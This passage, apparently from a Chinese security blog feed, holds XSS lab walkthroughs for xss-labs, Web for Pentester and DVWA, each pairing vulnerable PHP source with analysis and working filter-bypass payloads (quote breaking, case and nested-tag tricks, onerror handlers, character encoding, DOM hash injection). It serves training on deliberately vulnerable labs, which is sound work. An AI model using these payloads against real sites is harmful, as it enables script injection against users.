type=&quot;text&quot; onclick=alert(&#39;XSS&#39;) //</code></p><h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><h3 id="查看源码-10"><a href="#查看源码-10" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level12.php?keyword=破釜沉舟&quot;; }&lt;/script&gt;&lt;title&gt;第11关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第11关 为什么这么多搜索呢&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#39;HTTP_REFERER&#39;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/60a6e17f-c823-40c3-ab84-502b2f905456.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析:"></a>分析:</h3><p>str和str00都html实体化而且不在script标签内部，且闭合为’,应该无解，然后发现str33，没有实体化，$_SERVER[‘HTTP_REFERER’]获取httpreferer信息，只是过滤了&lt; &gt; ,可以闭合双引号来绕过,不过我没明白这题啥用</p><h3 id="payload-10"><a href="#payload-10" class="headerlink" title="payload:"></a>payload:</h3><p><code>&quot; type = &quot;text&quot; onclick=alert(&#39;xss&#39;)//</code><br><img src="https://Lmg66.github.io/img/134.png" alt="图片"></p><h2 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h2><h3 id="查看源码-11"><a href="#查看源码-11" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level13.php?keyword=矢志不渝&quot;; }&lt;/script&gt;&lt;title&gt;第12关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第12关 黑人问号&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ua&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/f4558b8c-778b-4dd8-bef6-425766f9d178.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析:"></a>分析:</h3><p>和上一关一样，xss位置变一下</p><h3 id="payload-11"><a href="#payload-11" class="headerlink" title="payload:"></a>payload:</h3><p><code>&quot; type = &quot;text&quot; onclick=alert(&#39;xss&#39;)//</code><br><img src="https://Lmg66.github.io/img/135.png" alt="图片"></p><h2 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h2><h3 id="查看源码-12"><a href="#查看源码-12" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level14.php&quot;; }&lt;/script&gt;&lt;title&gt;第13关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第13关 做题好爽啊&lt;/h1&gt;&lt;?php setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_COOKIE[&quot;user&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_cook&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/c048c2e3-7937-478b-9781-0ee4d7214648.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析:"></a>分析:</h3><p>$_COOKIE[“user”];获取cookie，然后过滤&lt; &gt; 没有实体化输入，尝试闭合双引号</p><h3 id="payload-12"><a href="#payload-12" class="headerlink" title="payload:"></a>payload:</h3><pre><code>user=&quot; type = &quot;text&quot; onclick=alert(&#39;xss&#39;)//</code></pre><p><img src="https://Lmg66.github.io/img/136.png" alt="图片"></p><h2 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h2><h3 id="查看源码-13"><a href="#查看源码-13" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script src=&quot;https://chao.jsanhuan.cn/angular.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;); window.location.href=&quot;level15.php?keyword=业精于勤&quot;; }&lt;/script&gt;&lt;title&gt;第14关&lt;/title&gt;&lt;/head&gt;&lt;h1 align=center&gt;第14关 恭喜你快要通关了&lt;/h1&gt;&lt;p align=center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/54c95d0f-037b-4885-a3f4-f8a3ad5c9341.jpg&quot; width=&quot;20%&quot;&gt;&lt;/p&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;?&gt;</code></pre><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析:"></a>分析:</h3><p>传入src，然后实体化输出，然后似乎无解，仔细看前面ng-include:,<br>ng-include 指令用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。ng-include 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以传入其他关的xss，不过不知道这有啥用既然其他地点有xss<br><img src="https://Lmg66.github.io/img/137.png" alt="图片"></p><h3 id="payload-13"><a href="#payload-13" class="headerlink" title="payload:"></a>payload:</h3><pre><code>src=&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;</code></pre><p>由于引用的js代码失败，所以我没成功，但云靶机是对的，云靶机地址：<a href="https://www.xss.tv/" target="_blank" rel="noopener">https://www.xss.tv/</a><br><img src="https://Lmg66.github.io/img/138.png" alt="图片"></p><h2 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h2><h3 id="查看源码-14"><a href="#查看源码-14" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;ORZ ORZ ORZ 恭喜全部通过&quot;); window.location.href=&quot;success.txt&quot;; }&lt;/script&gt;&lt;title&gt;第15关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第15关 厉害了 Word哥&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/9ec67d16-a8b9-41cd-82fa-14b0c0f96e72.gif&quot;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析:"></a>分析:</h3><p>get传入可以word，转换为小写，让过滤script，空格，/，可以使用url编码来绕过<br>| 符号 |url编码 |<br>| ——– | —— |<br>| 回车     | %0d |<br>| 换行     | %0d |<br>payload:</p><pre><code>level15.php?keyword=&lt;img%0asrc=x%0aonerror=alert(&#39;XSS&#39;)&gt;</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>国光大佬:<a href="https://www.sqlsec.com/2020/01/xss.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/01/xss.html</a><br>最后欢迎访问我的博客:<a href="https://lmg66.github.io/">https://lmg66.github.io/</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web-for-Pentester靶场-xss部分</title>
      <link href="/posts/fb02.html"/>
      <url>/posts/fb02.html</url>
      
        <content type="html"><![CDATA[<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>官网:<a href="https://pentesterlab.com/" target="_blank" rel="noopener">https://pentesterlab.com/</a><br>下载地址:<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso" target="_blank" rel="noopener">https://isos.pentesterlab.com/web_for_pentester_i386.iso</a><br>安装方法:虚拟机按照，该靶场是封装在debian系统里，安装完成打开，ifconfig查看ip地址：<br><img src="https://Lmg66.github.io/img/75.png" alt="图片"><br><img src="https://Lmg66.github.io/img/76.png" alt="图片"><br>然后直接访问ip即可<br>web for pentester默认没有root密码，可以来设置密码，方便ssh连接等查看源码</p><pre><code>sudo passwd</code></pre><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><h4 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php        echo $_GET[&quot;name&quot;];?&gt;</code></pre><h4 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h4><p>没有任何的过滤，直接将get获取的打印</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><p>/xss/example1.php?name=<script>alert('xss')</script><br><img src="https://Lmg66.github.io/img/77.png" alt="图片"></p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><h4 id="查看源码-1"><a href="#查看源码-1" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php        $name =  $_GET[&quot;name&quot;];        $name = preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;, $name);        $name = preg_replace(&quot;/&lt;\/script&gt;/&quot;,&quot;&quot;, $name);echo $name;?&gt;</code></pre><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析:"></a>分析:</h4><p>这里通过preg_replace()函数来正则<script> </script>,但是这种匹配是有缺陷的，没有匹配大小写，可以通过大小写绕过<br><img src="https://Lmg66.github.io/img/78.png" alt="图片"></p><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example2.php?name=&lt;Script&gt;alert(&#39;xss&#39;)&lt;/Script&gt;</code></pre><p><img src="https://Lmg66.github.io/img/79.png" alt="图片"></p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><h4 id="查看源码-2"><a href="#查看源码-2" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php        $name =  $_GET[&quot;name&quot;];        $name = preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;, $name);        $name = preg_replace(&quot;/&lt;\/script&gt;/i&quot;,&quot;&quot;, $name);echo $name;?&gt;</code></pre><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析:"></a>分析:</h4><p>在第二关的基础上加了/i，使之匹配不区分大小写，preg_replace()函数将匹配到的，替换成空格，但是只匹配了一次，类似sql注入(Seselectlect)，可以嵌套&lt;sc<script>ript> </sc</script>ript&gt;，匹配到了，替换成空格变成我们想要的了</p><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example3.php?name=&lt;sc&lt;script&gt;ript&gt;alert(&#39;xss&#39;)&lt;/sc&lt;/script&gt;ript&gt;</code></pre><p><img src="https://Lmg66.github.io/img/80.png" alt="图片"></p><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><h4 id="查看源码-3"><a href="#查看源码-3" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php require_once &#39;../header.php&#39;;if (preg_match(&#39;/script/i&#39;, $_GET[&quot;name&quot;])) {  die(&quot;error&quot;);}?&gt;Hello &lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;</code></pre><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析:"></a>分析:</h4><p>对script进行了不区分大小写，匹配如果匹配到，就执行die(“error”),终止程序，所以scirpt不能用，只能通过其他标签来触发js事件，可使用onerror事件，来执行js<br><img src="https://Lmg66.github.io/img/81.png" alt="图片"><br><img src="https://Lmg66.github.io/img/82.png" alt="图片"></p><h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example4.php?name=&lt;img src=&quot;xss&quot; onerror=alert(&#39;xss&#39;)&gt;</code></pre><p><img src="https://Lmg66.github.io/img/83.png" alt="图片"></p><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><h4 id="查看源码-4"><a href="#查看源码-4" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php require_once &#39;../header.php&#39;;if (preg_match(&#39;/alert/i&#39;, $_GET[&quot;name&quot;])) {  die(&quot;error&quot;);}?&gt;Hello &lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;</code></pre><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析:"></a>分析:</h4><p>对alert进行了过滤</p><h5 id="一-可以使用类似alert的方法来弹窗比如confirm，prompt"><a href="#一-可以使用类似alert的方法来弹窗比如confirm，prompt" class="headerlink" title="一.可以使用类似alert的方法来弹窗比如confirm，prompt"></a>一.可以使用类似alert的方法来弹窗比如confirm，prompt</h5><p><img src="https://Lmg66.github.io/img/84.png" alt="图片"><br><img src="https://Lmg66.github.io/img/85.png" alt="图片"></p><h5 id="二-通过编码绕过，String-fromCharCode-编码来绕过，可以使用hackbar来快速编码"><a href="#二-通过编码绕过，String-fromCharCode-编码来绕过，可以使用hackbar来快速编码" class="headerlink" title="二.通过编码绕过，String.fromCharCode()编码来绕过，可以使用hackbar来快速编码"></a>二.通过编码绕过，String.fromCharCode()编码来绕过，可以使用hackbar来快速编码</h5><p><img src="https://Lmg66.github.io/img/86.png" alt="图片"><br><img src="https://Lmg66.github.io/img/87.png" alt="图片"><br><img src="https://Lmg66.github.io/img/88.png" alt="图片"><br><img src="https://Lmg66.github.io/img/89.png" alt="图片"></p><h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example5.php?name=&lt;script&gt;confirm(&#39;xss&#39;)&lt;/script&gt;/xss/example5.php?name=&lt;script&gt;prompt(&#39;xss&#39;)&lt;/script&gt;/xss/example5.php?name=&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))&lt;/script&gt;</code></pre><p><img src="https://Lmg66.github.io/img/90.png" alt="图片"><br><img src="https://Lmg66.github.io/img/91.png" alt="图片"><br><img src="https://Lmg66.github.io/img/92.png" alt="图片"></p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><h4 id="查看源码-5"><a href="#查看源码-5" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;script&gt;        var $a= &quot;&lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;&quot;;&lt;/script&gt;</code></pre><h4 id="分析-5"><a href="#分析-5" class="headerlink" title="分析:"></a>分析:</h4><p>通过get的方式传入name变量，输入赋值给全局变量a，可以通过闭合双引号或者注释双引号来增加我们的js代码</p><h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example6.php?name=&quot;;alert(&#39;xss&#39;);&quot;/xss/example6.php?name=&quot;;alert(&#39;xss&#39;);//</code></pre><p><img src="https://Lmg66.github.io/img/93.png" alt="图片"><br><img src="https://Lmg66.github.io/img/94.png" alt="图片"><br><img src="https://Lmg66.github.io/img/95.png" alt="图片"><br><img src="https://Lmg66.github.io/img/96.png" alt="图片"></p><h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><h4 id="查看源码-6"><a href="#查看源码-6" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;script&gt;        var $a= &#39;&lt;?php  echo htmlentities($_GET[&quot;name&quot;]); ?&gt;&#39;;&lt;/script&gt;</code></pre><h4 id="分析-6"><a href="#分析-6" class="headerlink" title="分析:"></a>分析:</h4><p>和第八关相似htmlentities()会把字符转换为HTML实体，会将双引号进行编码，但不编码单引号，这里使用的是单引好所以可以继续包含和注释</p><h4 id="payload-6"><a href="#payload-6" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example7.php?name=&#39;;alert(&#39;xss&#39;);&#39;/xss/example7.php?name=&#39;;alert(&#39;xss&#39;);//</code></pre><p><img src="https://Lmg66.github.io/img/97.png" alt="图片"><br><img src="https://Lmg66.github.io/img/98.png" alt="图片"><br><img src="https://Lmg66.github.io/img/99.png" alt="图片"><br><img src="https://Lmg66.github.io/img/100.png" alt="图片"></p><h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><h4 id="查看源码-7"><a href="#查看源码-7" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php  require_once &#39;../header.php&#39;;if (isset($_POST[&quot;name&quot;])) {    echo &quot;HELLO &quot;.htmlentities($_POST[&quot;name&quot;]);  }?&gt;&lt;form action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]; ?&gt;&quot; method=&quot;POST&quot;&gt;Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</code></pre><h4 id="分析-7"><a href="#分析-7" class="headerlink" title="分析:"></a>分析:</h4><p>name变量通过form表单以post方式传入，然后通过htmlentities函数实体化后输出来，并未找到破解的方法。然后观察<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">，用户可控制参数PHP_SELF，并且没有闭合引号和标签</p><h4 id="payload-7"><a href="#payload-7" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example8.php/&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;///xss/example8.php/&quot; onclick=alert(&#39;XSS&#39;)//</code></pre><p><img src="https://Lmg66.github.io/img/101.png" alt="图片"><br><img src="https://Lmg66.github.io/img/102.png" alt="图片"><br><img src="https://Lmg66.github.io/img/103.png" alt="图片"></p><h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><h4 id="查看源码-8"><a href="#查看源码-8" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;script&gt;  document.write(location.hash.substring(1));&lt;/script&gt;</code></pre><h4 id="分析-8"><a href="#分析-8" class="headerlink" title="分析:"></a>分析:</h4><p>location.hash属性<br><img src="https://Lmg66.github.io/img/104.png" alt="图片"></p><h4 id="payload-8"><a href="#payload-8" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example9.php#&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code></pre><p>注意：在火狐和Chrome浏览器&lt;&gt;会被自动转码</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.sqlsec.com/2020/05/pentesterlab.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/05/pentesterlab.html</a><br><a href="https://blog.csdn.net/qq_20307987/article/details/51284169" target="_blank" rel="noopener">https://blog.csdn.net/qq_20307987/article/details/51284169</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA靶场-xss部分源码分析</title>
      <link href="/posts/b063.html"/>
      <url>/posts/b063.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>DVWA靶场都不陌生，最新学习xss，从新又搞了一遍xss部分，从源码方面康康xss的原因，参考了很多大佬的博客表示感谢</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>官网:<a href="">http://www.dvwa.co.uk/</a><br>下载地址:<a href="">https://github.com/ethicalhack3r/DVWA</a><br>下载方式:zip下载或git <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a><br>下载完成放入http服务下即可<br>我使用的是phpstudy下载地址:<a href="https://m.xp.cn/" target="_blank" rel="noopener">https://m.xp.cn/</a></p><h3 id="反射性xss"><a href="#反射性xss" class="headerlink" title="反射性xss"></a>反射性xss</h3><h4 id="级别low"><a href="#级别low" class="headerlink" title="级别low"></a>级别low</h4><h5 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Feedback for end user    $html .= &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;;}?&gt;</code></pre><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>name变量没有过滤，直接输出</p><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p><code>/vulnerabilities/xss_r/?name=&lt;script&gt;alert(&#39;xss&#39;)&lt;%2Fscript&gt;#</code></p><p><img src="https://Lmg66.github.io/img/105.png" alt="图片"></p><h4 id="级别-Medium"><a href="#级别-Medium" class="headerlink" title="级别:Medium"></a>级别:Medium</h4><h5 id="查看源码-1"><a href="#查看源码-1" class="headerlink" title="查看源码"></a>查看源码</h5><pre><code>&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Get input    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );    // Feedback for end user    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}?&gt;</code></pre><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>这里用正则表达过滤&lt;scr/ipt&gt;标签,正则的匹配有缺陷大小问题，而且只是匹配了一次可以嵌套，而且只是过滤&lt;scr/ipt&gt;还可以用其他标签代替来触发反射性xss</p><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><pre><code>vulnerabilities/xss_r/?name=&lt;Script&gt;alert(&#39;xss&#39;)&lt;%2FScript&gt;#vulnerabilities/xss_r/?name=&lt;img+src%3Dx+onerror%3Dalert(&#39;XSS&#39;)&gt;#/vulnerabilities/xss_r/?name=&lt;s&lt;script&gt;cript&gt;alert(&#39;XSS&#39;)&lt;%2Fscript&gt;#</code></pre><p><img src="https://Lmg66.github.io/img/106.png" alt="图片"><br><img src="https://Lmg66.github.io/img/107.png" alt="图片"><br><img src="https://Lmg66.github.io/img/108.png" alt="图片"></p><h4 id="级别-high"><a href="#级别-high" class="headerlink" title="级别:high"></a>级别:high</h4><h5 id="查看源码-2"><a href="#查看源码-2" class="headerlink" title="查看源码"></a>查看源码</h5><pre><code>&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Get input    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );    // Feedback for end user    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}?&gt;</code></pre><h5 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h5><p>不区分大小写，而且通配符匹配，嵌套无法使用，可以尝试其他标签触发弹窗</p><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><p><code>/vulnerabilities/xss_r/?name=&lt;img+src%3D&quot;xss&quot;+onerror%3Dalert(&#39;xss&#39;)&gt;#</code></p><h4 id="级别-impossible"><a href="#级别-impossible" class="headerlink" title="级别:impossible"></a>级别:impossible</h4><h5 id="查看源码-3"><a href="#查看源码-3" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $name = htmlspecialchars( $_GET[ &#39;name&#39; ] );    // Feedback for end user    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><h5 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h5><p>name变量通过htmlspecialchars()函数把预定的字符转为HTML实体，且输入到pre标签里，所以占时<br><img src="https://Lmg66.github.io/img/109.png" alt="图片"><br><img src="https://Lmg66.github.io/img/110.png" alt="图片"></p><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><h4 id="级别-low"><a href="#级别-low" class="headerlink" title="级别:low"></a>级别:low</h4><h5 id="查看源码-4"><a href="#查看源码-4" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;div class=&quot;vulnerable_code_area&quot;&gt;&lt;p&gt;Please choose a language:&lt;/p&gt;&lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt;            &lt;select name=&quot;default&quot;&gt;                &lt;script&gt;                    if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) {                        var lang = 